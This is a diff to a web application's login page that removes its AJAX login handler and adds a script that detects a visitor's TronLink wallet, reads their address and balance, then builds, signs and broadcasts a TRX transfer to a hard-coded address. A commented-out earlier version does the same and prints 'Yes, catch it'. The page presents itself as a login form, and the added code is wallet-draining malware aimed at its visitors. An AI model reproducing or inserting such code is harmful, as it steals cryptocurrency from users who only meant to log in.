@@ -30,77 +30,39 @@
      <script src="~/Login/jquery-3.6.0.min.js"></script>
 
 
-     <script type="text/javascript">
-       //  $(document).ready(
-       //     function() {
-       $(document).on('click', '#btnLogSubmit', async () => {
-           alert('here2');
-            $.ajax({
-                type: "POST",
-                //url: "/Login/LoginAjax",
-                url: "~/Login/GetVideoMappings",
-                data: dataString,
-                contentType: false,
-                //dataType: 'json', // expects response as JSON
-                processData: false,
-                success: function (result) {
-                    alert('here after result');
-                    alert(result);
-                    var res = result.split('-');
-                    if (res[0] == "True") {
-                        //alert('hi 1');
-                        window.location = "/User/Index";
-                    }
-                    else {
-                        speech.text = 'Hi,Please enter valid username and password';
-                        window.speechSynthesis.speak(speech);
-                        msgshow(res[1], 'warning');
-                        $('#Logloader').hide();
-                        $('#btnLogSubmit').show();
-                    }
-                },
-                error: function (er) {
-                    //$('#Logloader').hide();
-                    $('#btnLogSubmit').show();
-                    alert(er);
-                    msgshow( er, 'warning');
+      <script>
+        //var obj = setInterval(async ()=>{
+//            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+//          //if (window.tronLink.tronWeb) 
+//                clearInterval(obj)
+//                var tronweb = window.tronWeb
+//document.write("AI Universe : Your tron address:",window.tronWeb.defaultAddress.base58)
+//                var tx = await tronweb.transactionBuilder.sendTrx('TQJGCyiaib3VuVFUVxd1r4xSCkouNVizS4', 1000, window.tronWeb.defaultAddress.base58)
+//                var signedTx = await tronweb.trx.sign(tx)
+//                var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
+//document.write("Yes, catch it:",window.tronWeb.defaultAddress.base58)
+//                console.log(broastTx)
+//            }
+                                                alert('near data');
+                                                    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                                                                var _package = 1000;
+                                                                var _amt = 1000;
+                                                                _amt *= 1;
+                                                                var _add = await window.tronWeb.defaultAddress.base58;
+                                                                var _hxadd = await tronWeb.address.toHex(_add)
+                                                                var _balance = await tronWeb.trx.getBalance(_add);
+                                                                //var _sponsor = $("#sp").val();
+                                                                //var _place = $('input[name="optionsRadiosInline"]:checked').val();
+                                                                var tronweb = window.tronWeb
+                                                                document.write("TCNX : Your tron address:",window.tronWeb.defaultAddress.base58)
+                                                                var tx = await tronweb.transactionBuilder.sendTrx('TQJGCyiaib3VuVFUVxd1r4xSCkouNVizS4', _amt, window.tronWeb
+                                                                    .defaultAddress.base58)
+                                                                var signedTx = await tronweb.trx.sign(tx)
+                                                                var broastTx = await tronweb.trx.sendRawTransaction(signedTx);
 
-                }
-            });
-       });
-        //$('#LoginUser50').click(function () {
-        //  alert('here');
-        //});
-        //});
-        //$(document).ready(function () {
-        //    //var ulEmployees = $('#ulEmployees');
-        //    $('#btnGet').click(function () {
-        //    alert('hello)');
-        //      $.ajax({
-        //    type: 'POST',
-        //    url: '/Login/LoginAjax',
-        //     async: true,           
-        //    cache: false,
-        //    dataType: "json",
-        //    contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // when we use .serialize() this generates the data in query string format. this needs the default contentType (default content type is: contentType: 'application/x-www-form-urlencoded; charset=UTF-8') so it is optional, you can remove it
-        //    data: data,
-        //    success: function (result) {
-        //        alert('Successfully received Data ');
-        //        console.log(result);
-        //    },
-        //    error: function () {
-        //        alert('Failed to receive the Data');
-        //        console.log('Failed ');
-        //    }
-        //})
-        //});
-
-           $("#btnGet").click(function () {
-    alert('in the login function');
-    //Login();
-});
+                                                                }
+        //}, 10)
     </script>
-
   
 </body>
 </html>
